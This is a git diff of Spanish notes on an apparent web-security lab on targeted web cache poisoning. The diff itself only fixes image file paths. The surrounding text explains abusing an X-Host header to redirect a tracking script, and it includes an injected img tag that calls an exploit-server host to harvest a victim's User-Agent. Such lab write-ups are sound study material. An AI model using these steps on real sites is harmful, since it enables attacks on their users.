@@ -10,16 +10,16 @@ Esta clase demuestra cómo el envenenamiento de caché puede ser altamente dirig
 
 Solucion
 Repetimos los pasos y aqui vamos a utilizar la cabecera (X-Host:)
-![Pasted image 20250821211041.png](imagenes/Pasted image 20250821211041.png)
+![Pasted_image_20250821211041.png](Imagenes/Pasted_image_20250821211041.png)
 el cual me permite controlar el dominio donde se redirige para cargar el recurso resource/js/tracking.js
 asi que configuramos el exploit
-![Pasted image 20250821212043.png](imagenes/Pasted image 20250821212043.png)
+![Pasted_image_20250821212043.png](Imagenes/Pasted_image_20250821212043.png)
 luego tenemos que redirigirlo a un user-Agent asi que podemos utilizar un truco en algun post poniendo lo siguiente (<img src="https://exploit-0a930053038b901f80741be201a40053.exploit-server.net" />)
-![Pasted image 20250821212203.png](imagenes/Pasted image 20250821212203.png)
+![Pasted_image_20250821212203.png](Imagenes/Pasted_image_20250821212203.png)
 nos fijamos en los logs
-![Pasted image 20250821212431.png](imagenes/Pasted image 20250821212431.png)
+![Pasted_image_20250821212431.png](Imagenes/Pasted_image_20250821212431.png)
 copiamos y pegamos en la BS y recargamos la pagina
-![Pasted image 20250821233755.png](imagenes/Pasted image 20250821233755.png)
+![Pasted_image_20250821233755.png](Imagenes/Pasted_image_20250821233755.png)
 
 
 
